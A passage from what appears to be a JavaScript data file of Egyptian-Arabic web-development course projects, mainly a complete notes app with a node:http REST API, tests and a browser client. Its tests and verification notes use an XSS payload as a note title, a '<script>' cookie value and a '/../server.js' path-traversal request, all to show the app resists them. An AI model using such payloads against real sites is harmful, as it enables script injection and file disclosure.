- **الثيم كوكي ليه؟** عشان لو الصفحة دي اترسمت من سيرفر، السيرفر يقرا [[theme]] من أول طلب ويحط [[data-theme]] في الـ HTML (مشروع الملاحظات بيعمل ده). الحجم مالوش لازمة عند السيرفر، فـ [[localStorage]]. والتبويب للتاب ده بس، فـ [[sessionStorage]].
- **[[applySize]] بتقبل ٥ قيم بس:** أي حاجة تانية محفوظة (قديمة أو متعدّلة بإيد) بترجع ١٦. ده التحقق اللي درس «خلّي التطبيق يفتكر» بيطلبه.
- **[[addEventListener("storage", ...)]]:** بيطبّق الحجم الجديد اللي تاب تاني كتبه. التاب اللي كتب بيطبّق بنفسه في [[input]].

## ليه [[safeStorage]] مش [[const local = localStorage]]

قبل ما نكتب الصفحة قسنا الـ preview الحي بتاع الموقع: مجرد قراية [[localStorage]] جوه الـ sandbox بترمي [[SecurityError: Failed to read the 'localStorage' property from 'Window': The document is sandboxed and lacks the 'allow-same-origin' flag.]]، ونفس الكلام لـ [[sessionStorage]] و [[document.cookie]] (في القراية والكتابة). سطر زي [[const local = localStorage]] في أول السكربت كان هيوقف السكربت كله، والصفحة تبقى من غير ولا زرار شغال. ونفس ده بيحصل عند يوزر قافل الـ site data في المتصفح. فالقاعدة: أول وصول للتخزين جوه [[try]]، ومكان احتياطي.

**فخ الوحدات:** [[max-age]] بالثواني، فالأيام [[days * 86400]]. [[max-age=365]] كانت هتبقى ٦ دقايق.

## اتقاس

- Playwright في Chrome 157 من سيرفر [[node:http]] محلي: السطور فوق بتابين في نفس الـ context، ومفيش [[pageerror]].
- نفس الملف اتحط في [[showHTML]] بتاعة الموقع (نفس الـ sandbox بتاع الـ preview): الرسالة ظهرت والثيم اتغيّر.` },
        { lvl: 'كبير', dir: "notes-crud", t: R`تطبيق ملاحظات كامل: REST API وصفحة وتخزين واختبارات`, what: R`تطبيق ملاحظات بيشتغل من سيرفر واحد بـ [[node:http]] من غير مكتبات: الـ API [[/api/notes]] (لستة، وإضافة 201، وتعديل [[PATCH]] بـ [[version]] و 409 لو الملاحظة اتعدلت من مكان تاني، ومسح 204، و 400 و 404 و 405 و 413)، وبيقدّم الصفحة نفسها من نفس الـ origin. الصفحة: لستة وفورم إضافة وتعديل ومسح بتأكيد، وكل الطلبات بـ [[fetch]] ودالة واحدة للأخطاء. المسودة بتتحفظ في [[localStorage]] مع كل حرف وترجع بعد الـ reload وتتمسح بعد الحفظ، والثيم في كوكي والسيرفر بيقراه ويحطه في الـ HTML قبل ما الصفحة توصل (مفيش وميض). حالات الخطأ: السيرفر واقف = بانر أحمر والمسودة باقية، و 400 تحت الفورم، و 409 رسالة والتعديل يتحفظ في المحاولة التانية، و 404 يرجّع اللستة. و [[node --test]] بـ ٨ اختبارات للـ API. من الوحدة كلها.`, done: R`[[node --test]] = ٨ pass. وفي المتصفح: مسودة اتكتبت ورجعت بعد reload، والحفظ مسحها؛ عنوان [[<img src=x onerror=alert(1)>]] اتعرض نص ومفيش [[img]] في الصفحة؛ عنوان فاضي = «العنوان مطلوب»؛ تعديل بعد ما تاب تاني عدّل = «الملاحظة اتعدلت من مكان تاني» والمحاولة التانية نجحت؛ «امسح» بقت «متأكد؟» والضغطة التانية مسحت؛ الثيم الغامق رجع بعد reload والـ HTML جاي من السيرفر فيه [[data-theme="dark"]]؛ والسيرفر واقف = بانر «السيرفر مش بيرد» والمسودة لسه محفوظة.`, ext: R`(١) احفظ الملاحظات في ملف JSON بـ [[fs/promises]] (اكتب في ملف مؤقت وبعدين [[rename]] عشان الملف ميبوظش لو السيرفر وقع في النص). (٢) بحث بـ [[?q=]] في السيرفر و [[URLSearchParams]] في الصفحة. (٣) في الـ 409 اعرض النسختين جنب بعض واليوزر يختار بدل ما التانية تكتب فوق. (٤) [[ETag]] و [[If-Match]] بدل [[version]] في الـ body (ده الشكل الرسمي في HTTP). (٥) الإشعارات من مشروع «إشعارات بتدخل وتخرج» بعد كل حفظ ومسح.`, sol: R`## الشكل النهائي

اللقطة دي من الصفحة الحقيقية بعد ملاحظتين، وفي الفورم مسودة بتتكتب (اتاخدت من Playwright والـ scripts متشالة، عشان الـ preview مفيهوش سيرفر):

~~~view 560
<!doctype html>
<html lang="ar" dir="rtl" data-theme="light">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>ملاحظاتي</title>
<style>
:root { --bg: #fff; --fg: #1b1b1b; --card: #f3f4f6; --line: #d1d5db; --accent: #0b6e4f; --err: #b42318; }
[data-theme="dark"] { --bg: #111418; --fg: #e8eaed; --card: #1d2228; --line: #3a414a; --accent: #5fd3a6; --err: #ff8a80; }
* { box-sizing: border-box; }
body { margin: 0 auto; max-width: 640px; padding: 16px; font: 16px/1.6 system-ui, sans-serif; background: var(--bg); color: var(--fg); }
header { display: flex; justify-content: space-between; align-items: center; gap: 8px; }
h1 { font-size: 1.5rem; margin: 0; }
label { display: block; margin-block: 8px; }
input, textarea { display: block; width: 100%; padding: 8px; font: inherit; color: inherit; background: var(--card); border: 1px solid var(--line); border-radius: 6px; }
button { font: inherit; padding: 6px 14px; border-radius: 6px; border: 1px solid var(--line); background: var(--card); color: inherit; cursor: pointer; }
button[type="submit"] { background: var(--accent); color: var(--bg); border-color: var(--accent); }
.row { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
.error { color: var(--err); min-height: 1.6em; margin: 0; }
#banner { background: var(--err); color: #fff; padding: 8px 12px; border-radius: 6px; }
#list { list-style: none; padding: 0; display: grid; gap: 10px; }
.note { background: var(--card); border: 1px solid var(--line); border-radius: 8px; padding: 10px 14px; }
.note h2 { font-size: 1.1rem; margin: 0 0 4px; }
.note .body { margin: 0 0 8px; white-space: pre-wrap; overflow-wrap: anywhere; }
.note.editing { outline: 2px solid var(--accent); }
</style>
</head>
<body>
  <header>
    <h1>ملاحظاتي</h1>
    <button id="theme" type="button" aria-pressed="false">الوضع الغامق</button>
  </header>
  <form id="form">
    <label>العنوان <input name="title" maxlength="80" value="مسودة لسه"></label>
    <label>الملاحظة <textarea name="body" rows="3" maxlength="2000"></textarea></label>
    <p id="form-error" class="error" aria-live="polite"></p>
    <div class="row">
      <button id="save" type="submit">أضف</button>
      <small id="draft-state">المسودة محفوظة</small>
    </div>
  </form>
  <ul id="list">
    <li class="note">
      <h2>ميعاد الدكتور</h2>
      <p class="body">الخميس الساعة ٦</p>
      <div class="row"><button type="button">عدّل</button> <button type="button">امسح</button></div>
    </li>
    <li class="note">
      <h2>اشتري بن</h2>
      <p class="body">نص كيلو محوّج</p>
      <div class="row"><button type="button">عدّل</button> <button type="button">امسح</button></div>
    </li>
  </ul>
</body>
</html>
~~~

## هتشوف إيه

صفحة واحدة: فوق العنوان وزرار الثيم، وبعدين الفورم (عنوان وملاحظة و «أضف» وجنبه حالة المسودة)، وتحت الملاحظات كروت، الأحدث فوق. «عدّل» بيملا الفورم ويعلّم على الكارت بإطار أخضر والزرار يبقى «احفظ التعديل» ويظهر «إلغاء التعديل». «امسح» بيبقى «متأكد؟» والضغطة التانية بتمسح. «الوضع الغامق» بيقلب الألوان كلها وبيفضل بعد الـ reload. والسيرفر لو وقف بانر أحمر فوق.

## ليه الأدوات دي

| الحاجة | اخترنا | البديل | ليه هنا |
|---|---|---|---|
| السيرفر | [[node:http]] | Express أو Fastify | ٣ routes بس، ومن غير مكتبة كل سطر في الطلب والرد باين (ده هدف الوحدة). في مشروع أكبر Express بيوفّر الـ routing والـ body parsing |
| التخزين في السيرفر | [[Map]] في الذاكرة | ملف JSON أو SQLite | أبسط حاجة تختبر بيها الـ API. بتروح مع الـ restart (أول بند في التوسعة) |
| التعارض | [[version]] في الـ body و 409 | [[ETag]] و [[If-Match]] و 412 | نفس الفكرة (optimistic concurrency) وأسهل تتقري. الـ ETag هو الشكل الرسمي في HTTP |
| المسودة | [[localStorage]] | [[sessionStorage]] أو IndexedDB | لازم تعيش لو التاب اتقفل غلط، وصغيرة، والـ [[storage]] event ببلاش |
| الثيم | كوكي | [[localStorage]] | السيرفر محتاجه في أول طلب عشان يرسم الصفحة بالثيم الصح من غير وميض |
| الاختبارات | [[node --test]] | Vitest أو Jest | جوه Node، صفر تسطيب، و [[fetch]] جاهز |

## شجرة الملفات

~~~text
notes-crud/
├── server.js          الـ API، وبيقدّم الصفحة، وبيقرا كوكي الثيم
├── server.test.js     ٨ اختبارات للـ API بـ node --test
└── public/
    ├── index.html     الهيكل و template الكارت
    ├── style.css      الألوان بمتغيّرات، والغامق بـ [data-theme="dark"]
    └── app.js         fetch والرسم والمسودة والثيم
~~~

التشغيل: [[node server.js]] وافتح [[http://localhost:3000]]، والاختبارات: [[node --test]] من نفس الفولدر.

## الكود

~~~js server.js
// server.js: REST API للملاحظات + بيقدّم الصفحة نفسها من نفس الـ origin
const http = require("node:http");
const fs = require("node:fs/promises");
const path = require("node:path");

const FILES = {
  "/": ["index.html", "text/html; charset=utf-8"],
  "/app.js": ["app.js", "text/javascript; charset=utf-8"],
  "/style.css": ["style.css", "text/css; charset=utf-8"],
};
const THEMES = ["light", "dark"];

function createApp() {
  const notes = new Map();
  let nextId = 1;

  const send = (res, status, body) => {
    if (body === undefined) { res.writeHead(status); return res.end(); }
    res.writeHead(status, { "Content-Type": "application/json; charset=utf-8" });
    res.end(JSON.stringify(body));
  };

  async function readJson(req) {
    let text = "";
    for await (const chunk of req) {
      text += chunk;
      if (text.length > 10000) return { tooBig: true };
    }
    try { return { data: JSON.parse(text) }; } catch { return {}; }
  }

  function problem(body, partial) {
    if (!body || typeof body !== "object" || Array.isArray(body)) return "الـ body لازم JSON object";
    if (!partial || "title" in body) {
      if (typeof body.title !== "string" || !body.title.trim()) return "العنوان مطلوب";
      if (body.title.length > 80) return "العنوان أطول من ٨٠ حرف";
    }
    if ("body" in body && (typeof body.body !== "string" || body.body.length > 2000)) return "الملاحظة نص لحد ٢٠٠٠ حرف";
    return null;
  }

  function themeFrom(req) {
    const m = /(?:^|;\s*)theme=([^;]*)/.exec(req.headers.cookie || "");
    return m && THEMES.includes(m[1]) ? m[1] : "light";
  }

  return http.createServer(async (req, res) => {
    const url = new URL(req.url, "http://localhost");

    if (req.method === "GET" && FILES[url.pathname]) {
      const [file, type] = FILES[url.pathname];
      let text = await fs.readFile(path.join(__dirname, "public", file), "utf8");
      if (file === "index.html") text = text.replace('data-theme="light"', 'data-theme="' + themeFrom(req) + '"');
      res.writeHead(200, { "Content-Type": type, "Cache-Control": "no-cache" });
      return res.end(text);
    }

    const m = url.pathname.match(/^\/api\/notes(?:\/(\d+))?$/);
    if (!m) return send(res, 404, { error: "مش موجود" });
    const id = m[1] ? Number(m[1]) : null;

    if (id === null) {
      if (req.method === "GET") return send(res, 200, [...notes.values()].sort((a, b) => b.updatedAt - a.updatedAt));
      if (req.method === "POST") {
        const { data, tooBig } = await readJson(req);
        if (tooBig) return send(res, 413, { error: "الطلب كبير" });
        const why = problem(data, false);
        if (why) return send(res, 400, { error: why });
        const note = { id: nextId++, title: data.title.trim(), body: data.body ?? "", version: 1, updatedAt: Date.now() };
        notes.set(note.id, note);
        res.setHeader("Location", "/api/notes/" + note.id);
        return send(res, 201, note);
      }
      res.setHeader("Allow", "GET, POST");
      return send(res, 405, { error: "method مش مسموح" });
    }

    const note = notes.get(id);
    if (!note) return send(res, 404, { error: "الملاحظة دي اتمسحت أو مش موجودة" });
    if (req.method === "GET") return send(res, 200, note);
    if (req.method === "DELETE") { notes.delete(id); return send(res, 204); }
    if (req.method === "PATCH") {
      const { data, tooBig } = await readJson(req);
      if (tooBig) return send(res, 413, { error: "الطلب كبير" });
      const why = problem(data, true);
      if (why) return send(res, 400, { error: why });
      if (data.version !== note.version) return send(res, 409, { error: "الملاحظة اتعدلت من مكان تاني، حمّلها تاني", current: note });
      const next = { ...note, version: note.version + 1, updatedAt: Date.now() };
      if ("title" in data) next.title = data.title.trim();
      if ("body" in data) next.body = data.body;
      notes.set(id, next);
      return send(res, 200, next);
    }
    res.setHeader("Allow", "GET, PATCH, DELETE");
    return send(res, 405, { error: "method مش مسموح" });
  });
}

if (require.main === module) {
  const server = createApp();
  server.listen(process.env.PORT || 3000, () => console.log("الملاحظات على http://localhost:" + server.address().port));
}
module.exports = { createApp };
~~~

~~~js server.test.js
// server.test.js: اختبارات الـ API بـ node --test
const { test, before, after } = require("node:test");
const assert = require("node:assert/strict");
const { createApp } = require("./server.js");

let server, base;
before(async () => {
  server = createApp();
  await new Promise(r => server.listen(0, r));
  base = "http://localhost:" + server.address().port;
});
after(() => server.close());

const api = (path, method = "GET", body) =>
  fetch(base + path, { method, headers: body ? { "Content-Type": "application/json" } : {}, body: body && JSON.stringify(body) });

test("POST بيعمل ملاحظة ويرجّع 201 و Location", async () => {
  const res = await api("/api/notes", "POST", { title: "  اشتري بن  ", body: "نص كيلو" });
  assert.equal(res.status, 201);
  assert.equal(res.headers.get("location"), "/api/notes/1");
  const note = await res.json();
  assert.deepEqual([note.title, note.body, note.version], ["اشتري بن", "نص كيلو", 1]);
});

test("GET بيرجّع اللستة والملاحظة لوحدها", async () => {
  const list = await (await api("/api/notes")).json();
  assert.equal(list.length, 1);
  const one = await api("/api/notes/1");
  assert.equal(one.status, 200);
});

test("PATCH بالـ version الصح بيعدّل ويزوّد الـ version", async () => {
  const res = await api("/api/notes/1", "PATCH", { body: "كيلو كامل", version: 1 });
  assert.equal(res.status, 200);
  const note = await res.json();
  assert.deepEqual([note.title, note.body, note.version], ["اشتري بن", "كيلو كامل", 2]);
});

test("PATCH بـ version قديم = 409 ومعاه النسخة الحالية", async () => {
  const res = await api("/api/notes/1", "PATCH", { body: "قديم", version: 1 });
  assert.equal(res.status, 409);
  assert.equal((await res.json()).current.version, 2);
});

test("التحقق: 400 للعنوان الفاضي والـ JSON البايظ", async () => {
  assert.equal((await api("/api/notes", "POST", { title: "   " })).status, 400);
  const bad = await fetch(base + "/api/notes", { method: "POST", body: "{bad" });
  assert.equal(bad.status, 400);
  assert.equal((await api("/api/notes", "POST", { title: "x".repeat(81) })).status, 400);
});

test("DELETE = 204 وبعده 404، ومرتين = 404", async () => {
  assert.equal((await api("/api/notes/1", "DELETE")).status, 204);
  assert.equal((await api("/api/notes/1")).status, 404);
  assert.equal((await api("/api/notes/1", "DELETE")).status, 404);
});

test("405 و Allow للـ method الغلط", async () => {
  const res = await api("/api/notes", "PUT", { title: "x" });
  assert.equal(res.status, 405);
  assert.equal(res.headers.get("allow"), "GET, POST");
});

test("الصفحة بتاخد الثيم من الكوكي، والملفات اللي برّه اللستة 404", async () => {
  const page = await (await fetch(base + "/", { headers: { Cookie: "theme=dark" } })).text();
  assert.match(page, /data-theme="dark"/);
  const evil = await (await fetch(base + "/", { headers: { Cookie: "theme=<script>" } })).text();
  assert.match(evil, /data-theme="light"/);
  assert.equal((await fetch(base + "/../server.js")).status, 404);
  assert.equal((await fetch(base + "/public/app.js")).status, 404);
});
~~~

~~~html public/index.html
<!doctype html>
<html lang="ar" dir="rtl" data-theme="light">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>ملاحظاتي</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <header>
    <h1>ملاحظاتي</h1>
    <button id="theme" type="button" aria-pressed="false">الوضع الغامق</button>
  </header>
  <p id="banner" role="alert" hidden></p>
  <form id="form">
    <label>العنوان <input name="title" maxlength="80" required></label>
    <label>الملاحظة <textarea name="body" rows="3" maxlength="2000"></textarea></label>
    <p id="form-error" class="error" aria-live="polite"></p>
    <div class="row">
      <button id="save" type="submit">أضف</button>
      <button id="cancel" type="button" hidden>إلغاء التعديل</button>
      <small id="draft-state"></small>
    </div>
  </form>
  <p id="empty" hidden>مفيش ملاحظات لسه. اكتب أول واحدة فوق.</p>
  <ul id="list"></ul>
  <template id="note-tpl">
    <li class="note">
      <h2></h2>
      <p class="body"></p>
      <div class="row">
        <button type="button" data-act="edit">عدّل</button>
        <button type="button" data-act="delete">امسح</button>
      </div>
    </li>
  </template>
  <script src="app.js" defer></script>
</body>
</html>
~~~

~~~css public/style.css
:root { --bg: #fff; --fg: #1b1b1b; --card: #f3f4f6; --line: #d1d5db; --accent: #0b6e4f; --err: #b42318; }
[data-theme="dark"] { --bg: #111418; --fg: #e8eaed; --card: #1d2228; --line: #3a414a; --accent: #5fd3a6; --err: #ff8a80; }
* { box-sizing: border-box; }
body { margin: 0 auto; max-width: 640px; padding: 16px; font: 16px/1.6 system-ui, sans-serif; background: var(--bg); color: var(--fg); }
header { display: flex; justify-content: space-between; align-items: center; gap: 8px; }
h1 { font-size: 1.5rem; margin: 0; }
label { display: block; margin-block: 8px; }
input, textarea { display: block; width: 100%; padding: 8px; font: inherit; color: inherit; background: var(--card); border: 1px solid var(--line); border-radius: 6px; }
button { font: inherit; padding: 6px 14px; border-radius: 6px; border: 1px solid var(--line); background: var(--card); color: inherit; cursor: pointer; }
button[type="submit"] { background: var(--accent); color: var(--bg); border-color: var(--accent); }
.row { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
.error { color: var(--err); min-height: 1.6em; margin: 0; }
#banner { background: var(--err); color: #fff; padding: 8px 12px; border-radius: 6px; }
#list { list-style: none; padding: 0; display: grid; gap: 10px; }
.note { background: var(--card); border: 1px solid var(--line); border-radius: 8px; padding: 10px 14px; }
.note h2 { font-size: 1.1rem; margin: 0 0 4px; }
.note .body { margin: 0 0 8px; white-space: pre-wrap; overflow-wrap: anywhere; }
.note.editing { outline: 2px solid var(--accent); }
~~~

~~~js public/app.js
// app.js: الصفحة بتكلّم الـ API بـ fetch، وبتفتكر المسودة في localStorage والثيم في كوكي
const API = "/api/notes";
const DRAFT_KEY = "notes-draft";
const $ = sel => document.querySelector(sel);
const form = $("#form");
let notes = [];
let editing = null; // وقت التعديل: { id, version }

// ١. التخزين: localStorage ممكن يرمي (sandbox أو إعدادات)، فكل وصول جوه try
const store = {
  get(key) { try { return localStorage.getItem(key); } catch { return null; } },
  set(key, value) { try { localStorage.setItem(key, value); return true; } catch { return false; } },
  remove(key) { try { localStorage.removeItem(key); } catch {} },
};

// ٢. الطلبات: دالة واحدة بتحوّل أي رد مش ok لـ Error فيه الـ status ورسالة السيرفر
async function request(path, method = "GET", body) {
  let res;
  try {
    res = await fetch(path, { method, headers: body ? { "Content-Type": "application/json" } : {}, body: body && JSON.stringify(body) });
  } catch {
    throw Object.assign(new Error("السيرفر مش بيرد. اتأكد إنه شغال وجرّب تاني."), { status: 0 });
  }
  const data = res.status === 204 ? null : await res.json().catch(() => null);
  if (!res.ok) throw Object.assign(new Error(data?.error || "حصل خطأ " + res.status), { status: res.status, data });
  return data;
}

function banner(text) {
  $("#banner").textContent = text || "";
  $("#banner").hidden = !text;
}

// ٣. الرسم: textContent بس، عشان عنوان فيه <script> يتكتب نص
function render() {
  const list = $("#list");
  list.replaceChildren();
  for (const note of notes) {
    const li = $("#note-tpl").content.firstElementChild.cloneNode(true);
    li.dataset.id = note.id;
    li.querySelector("h2").textContent = note.title;
    li.querySelector(".body").textContent = note.body;
    li.classList.toggle("editing", editing?.id === note.id);
    list.append(li);
  }
  $("#empty").hidden = notes.length > 0;
}

async function load() {
  try {
    notes = await request(API);
    banner("");
  } catch (err) {
    banner(err.message);
  }
  render();
}

// ٤. المسودة: كل حرف بيتحفظ، وبتتمسح بعد الحفظ الناجح
function saveDraft() {
  if (editing) return;
  const ok = store.set(DRAFT_KEY, JSON.stringify({ title: form.title.value, body: form.body.value }));
  $("#draft-state").textContent = ok ? "المسودة محفوظة" : "المسودة مش هتتحفظ هنا (التخزين مقفول)";
}
function restoreDraft() {
  try {
    const draft = JSON.parse(store.get(DRAFT_KEY));
    if (draft && typeof draft.title === "string") {
      form.title.value = draft.title;
      form.body.value = typeof draft.body === "string" ? draft.body : "";
      $("#draft-state").textContent = "رجّعنا المسودة";
    }
  } catch {
    store.remove(DRAFT_KEY);
  }
}

function startEdit(note) {
  editing = { id: note.id, version: note.version };
  form.title.value = note.title;
  form.body.value = note.body;
  $("#save").textContent = "احفظ التعديل";
  $("#cancel").hidden = false;
  form.title.focus();
  render();
}
function stopEdit() {
  editing = null;
  form.reset();
  $("#save").textContent = "أضف";
  $("#cancel").hidden = true;
  $("#form-error").textContent = "";
  restoreDraft();
  render();
}

form.addEventListener("input", saveDraft);
form.addEventListener("submit", async e => {
  e.preventDefault();
  const body = { title: form.title.value, body: form.body.value };
  $("#save").disabled = true;
  $("#form-error").textContent = "";
  try {
    if (editing) {
      await request(API + "/" + editing.id, "PATCH", { ...body, version: editing.version });
      stopEdit();
    } else {
      await request(API, "POST", body);
      form.reset();
      store.remove(DRAFT_KEY);
      $("#draft-state").textContent = "";
    }
    await load();
  } catch (err) {
    if (err.status === 0) banner(err.message);
    else $("#form-error").textContent = err.message;
    if (err.status === 404) { stopEdit(); await load(); }
    if (err.status === 409) editing.version = err.data.current.version;
  } finally {
    $("#save").disabled = false;
  }
});
$("#cancel").addEventListener("click", stopEdit);

// ٥. event delegation: listener واحد على اللستة لكل الزراير
$("#list").addEventListener("click", async e => {
  const btn = e.target.closest("button[data-act]");
  if (!btn) return;
  const id = Number(btn.closest("li").dataset.id);
  const note = notes.find(n => n.id === id);
  if (btn.dataset.act === "edit") return startEdit(note);
  if (btn.dataset.confirm !== "1") {
    btn.dataset.confirm = "1";
    btn.textContent = "متأكد؟";
    return;
  }
  try {
    await request(API + "/" + id, "DELETE");
  } catch (err) {
    if (err.status !== 404) return banner(err.message);
  }
  if (editing?.id === id) stopEdit();
  await load();
});

// ٦. الثيم في كوكي: السيرفر بيقراه ويحطه في الـ HTML قبل ما الصفحة توصل، فمفيش وميض
function setTheme(theme) {
  document.documentElement.dataset.theme = theme;
  document.cookie = "theme=" + theme + "; max-age=" + 60 * 60 * 24 * 365 + "; path=/; SameSite=Lax";
  $("#theme").setAttribute("aria-pressed", String(theme === "dark"));
}
$("#theme").setAttribute("aria-pressed", String(document.documentElement.dataset.theme === "dark"));
$("#theme").addEventListener("click", () => setTheme(document.documentElement.dataset.theme === "dark" ? "light" : "dark"));

// ٧. تاب تاني غيّر المسودة؟ حدّث الفورم هنا
addEventListener("storage", e => { if (e.key === DRAFT_KEY && !editing) restoreDraft(); });

restoreDraft();
load();
~~~

## ترتيب البناء

1. **الـ API لوحده واختباراته:** [[createApp()]] بترجّع السيرفر من غير [[listen]]، فالاختبار يشغّله على بورت [[0]] (أي بورت فاضي) ويقفله في الآخر. اتكتبت الاختبارات مع كل route.
2. **الصفحة الثابتة:** [[FILES]] لستة بيضا بالملفات المسموح بيها بالظبط. مفيش [[path.join]] على عنوان جاي من اليوزر، فـ [[/../server.js]] مستحيل (اختبار ٨).
3. **[[request()]] في الصفحة:** دالة واحدة لكل الطلبات بتحوّل الشبكة الواقعة لـ [[status: 0]] والرد اللي مش ok لـ [[Error]] فيه [[status]] و [[data]].
4. **الرسم:** [[template]] و [[cloneNode(true)]] و [[textContent]] بس، و [[replaceChildren()]] كل مرة.
5. **المسودة والثيم والأحداث** في الآخر.

## أهم الحتت

- **الـ 409 (optimistic concurrency):** كل ملاحظة ليها [[version]] بيزيد مع كل تعديل. الصفحة بتبعت الـ version اللي عندها مع [[PATCH]]، ولو السيرفر لقاه قديم (حد عدّل من تاب تاني) بيرجّع 409 ومعاه [[current]]. الصفحة بتعرض الرسالة وبتاخد الـ version الجديد، فالضغطة التانية على «احفظ التعديل» بتنجح. يعني اليوزر اتبلّغ وقرر يكتب فوق.
- **الثيم من غير وميض:** [[themeFrom(req)]] بيقرا الكوكي من [[req.headers.cookie]] ويحطها في [[data-theme]] قبل ما الـ HTML يتبعت. ولو الكوكي فيها أي حاجة غير [["light"]] و [["dark"]] (زي [[<script>]]) بيحط [["light"]]: قيمة من اليوزر رايحة جوه HTML لازم تبقى من لستة (اختبار ٨).
- **[[readJson]] بحد ١٠٠٠٠ حرف** و 413: من غيره أي حد يبعت body بجيجا والسيرفر يجمّعه في الذاكرة.
- **[[store]] في الصفحة:** [[localStorage]] جوه [[try]] في كل وصول، و «المسودة مش هتتحفظ هنا» لو ممنوع.
- **[[saveDraft]] بيتجاهل وقت التعديل:** وإلا تعديل ملاحظة قديمة كان هيكتب فوق مسودة ملاحظة جديدة.
- **المسح بتأكيد من غير [[confirm()]]:** [[data-confirm]] على الزرار، وأول ضغطة بتغيّر النص بس. [[confirm()]] بيوقف الصفحة كلها ومش بيتعمله style. والـ 404 في المسح بيتعامل كنجاح (اتمسحت خلاص من مكان تاني).

## اللي ظهر وإحنا بنبنيه

- **أول تجربة من Playwright قالت [[page.goto: net::ERR_CONNECTION_REFUSED at http://localhost:3100/]]:** السيرفر اتشغّل في الخلفية والمتصفح سبقه. [[curl -s localhost:3100/api/notes]] بعدها بثانية رجّع [[[]]]، فالحل إنك تستنى سطر «الملاحظات على http://localhost:3100» قبل ما تفتح الصفحة (وفي CI: سكربت يستنى البورت).
- **الـ 409 مش «دمج»:** في التجربة، تاب تاني غيّر نص الملاحظة لـ «من تاب تاني»، وبعدين احنا حفظنا «كيلو كامل»: أخدنا 409، والضغطة التانية نجحت وكتبت «كيلو كامل» فوق «من تاب تاني». اليوزر اتبلّغ، بس التعديل التاني راح. ده سلوك مقصود هنا ومكتوب في التوسعة (٣) إزاي تعرض النسختين.
- **[[PATCH]] بينسخ [[title]] و [[body]] بس:** لو كان [[{ ...note, ...data }]] كان الـ [[version]] اللي جاي من الصفحة (القديم) هيكتب فوق الجديد، وأي حقل زيادة في الـ body هيتخزّن.

## اتقاس

~~~text الناتج: node --test (Node 24.22)
✔ POST بيعمل ملاحظة ويرجّع 201 و Location
✔ GET بيرجّع اللستة والملاحظة لوحدها
✔ PATCH بالـ version الصح بيعدّل ويزوّد الـ version
✔ PATCH بـ version قديم = 409 ومعاه النسخة الحالية
✔ التحقق: 400 للعنوان الفاضي والـ JSON البايظ
✔ DELETE = 204 وبعده 404، ومرتين = 404
✔ 405 و Allow للـ method الغلط
✔ الصفحة بتاخد الثيم من الكوكي، والملفات اللي برّه اللستة 404
ℹ tests 8
ℹ pass 8
ℹ fail 0
~~~

~~~text الناتج: الصفحة في Chrome 157 من PORT=3100 node server.js، Playwright
الأول:              «مفيش ملاحظات لسه» ظاهرة
كتابة:              المسودة محفوظة | {"title":"اشتري بن","body":"نص كيلو محوّج"}
reload:             اشتري بن / رجّعنا المسودة
أضف:                الكروت: اشتري بن | المسودة في localStorage: null
عنوان فيه <img ...>: الـ h2 فيه &lt;img src=x onerror=alert(1)&gt; وعدد img في اللستة: 0
عنوان مسافات:        العنوان مطلوب
عدّل:               كارت عليه إطار: 1، الزرار: احفظ التعديل
PATCH من برّه الفورم (زي تاب تاني) وبعدين احفظ: الملاحظة اتعدلت من مكان تاني، حمّلها تاني
احفظ تاني:          الملاحظة اتحفظت، الزرار رجع: أضف
امسح:               متأكد؟ ← وبعدين اتمسحت
الثيم:              cookie: theme=dark ← الـ HTML من السيرفر فيه data-theme="dark" ← بعد reload: dark و aria-pressed=true
السيرفر واقف:        بانر «السيرفر مش بيرد. اتأكد إنه شغال وجرّب تاني.» والمسودة لسه في localStorage
عرض 360:            scrollWidth = 360 (مفيش scroll أفقي)
~~~

ومفيش ولا [[pageerror]]. الأخطاء اللي في الـ Console كانت الـ 400 والـ 409 والـ 404 بتوع [[favicon.ico]] (المتصفح بيطبع أي رد مش ok كـ «Failed to load resource» حتى لو الكود اتعامل معاه).` },
        { lvl: 'فكرة', dir: "storage-inspector", t: R`مفتش التخزين`, what: R`صفحة صغيرة تحطها في أي مشروع بتعرض كل اللي الـ origin ده حاطه في المتصفح من JavaScript: الكوكيز (اللي مش [[HttpOnly]])، و [[localStorage]] و [[sessionStorage]] بالمفاتيح والحجم، وقواعد IndexedDB، وكاشات Cache API بعدد الطلبات، والـ service workers المتسجلة، و [[navigator.storage.estimate()]]. وجنب كل قسم «امسح الكل». وأي قسم ممنوع يكتب «مش متاح هنا» بدل ما الصفحة تقع. من درس «تختار تخزين إيه».`, done: R`على origin فاضي كل الأقسام «فاضي»، و «حط بيانات تجربة» بيملا كوكي ومفتاحين وقاعدة وكاش، وكل «امسح الكل» بيفضّي قسمه، والـ service worker المتسجل بيظهر ويتشال. وفي الـ preview الحي كل قسم «مش متاح هنا: الصفحة معزولة (origin = null)».`, ext: R`(١) زرار تصدير كل ده JSON وتحميله بـ [[Blob]] و [[a.download]]، وزرار استيراد. (٢) جوه IndexedDB اعرض الـ object stores وعدد السجلات في كل واحد. (٣) اسمع على [[storage]] و [[cookieStore]] [[change]] وحدّث لوحده. (٤) خليه bookmarklet أو DevTools snippet تشغّله على أي موقع.`, sol: R`## الشكل النهائي

~~~live 560 index.html
<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>مفتش التخزين</title>
<style>
  body { margin: 16px; font: 15px/1.6 system-ui, sans-serif; }
  section { border: 1px solid #ccc; border-radius: 8px; padding: 8px 12px; margin-block: 10px; }
  h2 { font-size: 1.05rem; margin: 0 0 6px; display: flex; justify-content: space-between; gap: 8px; }
  table { border-collapse: collapse; width: 100%; font-size: 14px; table-layout: fixed; }
  td, th { border-bottom: 1px solid #eee; padding: 2px 6px; text-align: start; overflow-wrap: anywhere; }
  .muted { color: #666; }
  button { font: inherit; font-size: 13px; }
</style>
</head>
<body>
<h1>مفتش التخزين</h1>
<p class="muted">كل اللي الموقع ده (<span id="origin"></span>) حاطه في متصفحك، من JavaScript.</p>
<p><button type="button" id="demo">حط بيانات تجربة</button> <button type="button" id="refresh">حدّث</button></p>
<div id="out"></div>
<script>
const out = document.querySelector("#out");
const size = s => new Blob([s]).size; // حجم النص بالبايت UTF-8
